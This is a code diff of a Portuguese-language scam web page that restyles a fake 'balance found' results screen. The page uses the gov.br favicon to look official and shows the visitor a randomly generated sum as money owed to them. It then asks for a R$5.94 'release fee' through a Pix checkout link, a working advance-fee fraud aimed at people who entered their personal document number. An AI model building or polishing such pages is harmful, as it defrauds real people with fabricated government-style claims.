@@ -1,16 +1,15 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Resultado da Consulta</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="shortcut icon" href="https://www.gov.br/favicon.ico" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="https://www.gov.br/favicon.ico" type="image/x-icon" />
   <style>
     html, body {
       margin: 0;
       padding: 0;
-      min-height: 100vh; /* Cresce se precisar */
-      overflow-x: hidden; /* Só bloqueia rolagem horizontal */
+      min-height: 100vh;
       font-family: Arial, sans-serif;
       background: #f0f2f5;
     }
@@ -26,11 +25,14 @@
       align-items: center;
       background: white;
       max-width: 600px;
-      margin: auto;
+      margin: 30px auto;
       padding: 30px 20px;
       box-shadow: 0 0 15px rgba(0,0,0,0.1);
       border-radius: 6px;
       text-align: center;
+      min-height: 400px;
+      position: relative;
+      z-index: 1;
     }
     .valor {
       font-size: 32px;
@@ -52,7 +54,7 @@
     }
     .botao {
       margin-top: 25px;
-      display: inline-block;
+      display: inline-block !important;
       background: #0071bc;
       color: white;
       padding: 15px 25px;
@@ -63,6 +65,12 @@
       max-width: 350px;
       text-align: center;
       box-sizing: border-box;
+      cursor: pointer;
+      z-index: 10;
+      transition: background-color 0.3s ease;
+    }
+    .botao:hover {
+      background: #005a8a;
     }
     /* Ajustes para telas pequenas */
     @media (max-width: 480px) {
@@ -77,29 +85,34 @@
   </style>
 </head>
 <body>
-<header>
-  <h1>Resultado da Consulta</h1>
-</header>
-<div class="container" id="conteudo"></div>
-<script>
-  const ref = sessionStorage.getItem("k") || "---";
-  const doc = ref !== "---" ? atob(ref).split("|")[0] : "---";
-  const valor = (Math.random() * (4979 - 843) + 843).toFixed(2).replace(".", ",");
+  <header>
+    <h1>Resultado da Consulta</h1>
+  </header>
+  <div class="container" id="conteudo"></div>
 
-  document.getElementById("conteudo").innerHTML = `
-    <h2>Saldo Encontrado com Sucesso</h2>
-    <div class="cpf-box">Documento consultado: <strong>${doc}</strong></div>
-    <p>Foi localizado um valor disponível no seu nome:</p>
-    <div class="valor">R$ ${valor}</div>
-    <div class="info">
-      Para receber esse valor via Pix, confirme sua identidade e efetue a liberação com uma taxa única de <strong>R$ 5,94</strong>.
-      <br><br>
-      Após a confirmação, o Pix será enviado em até <strong>24h úteis</strong>.
-    </div>
-    <a class="botao" href="https://pay.safepagoficial.com/checkout/e46f9230-7044-49c3-94bf-ce984b545247" target="_blank">
-      Confirmar Liberação via Pix
-    </a>
-  `;
-</script>
+  <script>
+    // Pega o valor do sessionStorage "k"
+    const ref = sessionStorage.getItem("k") || "---";
+    const doc = ref !== "---" ? atob(ref).split("|")[0] : "---";
+
+    // Gera valor aleatório formatado para mostrar
+    const valor = (Math.random() * (4979 - 843) + 843).toFixed(2).replace(".", ",");
+
+    // Monta o conteúdo HTML da página
+    document.getElementById("conteudo").innerHTML = `
+      <h2>Saldo Encontrado com Sucesso</h2>
+      <div class="cpf-box">Documento consultado: <strong>${doc}</strong></div>
+      <p>Foi localizado um valor disponível no seu nome:</p>
+      <div class="valor">R$ ${valor}</div>
+      <div class="info">
+        Para receber esse valor via Pix, confirme sua identidade e efetue a liberação com uma taxa única de <strong>R$ 5,94</strong>.
+        <br><br>
+        Após a confirmação, o Pix será enviado em até <strong>24h úteis</strong>.
+      </div>
+      <a class="botao" href="https://pay.safepagoficial.com/checkout/e46f9230-7044-49c3-94bf-ce984b545247" target="_blank" rel="noopener noreferrer">
+        Confirmar Liberação via Pix
+      </a>
+    `;
+  </script>
 </body>
 </html>
